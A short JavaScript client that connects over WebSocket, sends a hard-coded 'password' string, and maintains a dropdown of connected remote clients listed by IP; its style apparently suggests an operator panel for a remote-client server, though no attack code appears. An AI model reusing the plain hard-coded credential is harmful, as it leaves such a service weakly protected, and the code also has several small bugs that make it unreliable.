const ws = new WebSocket(`${window.location.origin.replace(/^http/, "ws")}/ws`);
const list = document.getElementById("users")
function find(name){
    let options = list.getElementsByTagName("option")
    for(let i = 0; i < options.length; i++){
        let option = options[i]
        if(option.value == name){
            return {item: option, index: i}
        }
    }
    console.log(`[?] Item [${name}] Cant Be Found`)
    return "not found"
}
ws.onopen = () => {
    ws.send("password")
}
ws.onmessage = function(msg){
    var message
    try {
        message = JSON.parse(msg.data)
    } catch(err){
        console.log("[-] Message Is Not Valid JSON")
    }
    switch(message.type){
        case "Init":
            // init the client list
            message.data.users.forEach(client => {
                var user = document.createElement('option');
                user.value = client
                user.innerText = client
                list.appendChild(user)
                console.log(client)
            });
            break;
        case "Add":
            // new client
            console.log(`[+] Added [${message.data.tag}] to client list`)
            var user = document.createElement('option');
            user.value = message.data.tag
            user.innerText = message.data.ip
            list.appendChild(user)
            break;
        case "Sub":
            // client dc'd
            console.log(`[-] Removed [${message.data}] from client list`)
            list.remove(find(message.data.tag).index);
            break;
        default:
            // other message with correct format
            console.log(`[?] Message [${message.data}] Dose Not Contain A Known Type`)
            break;
    }
}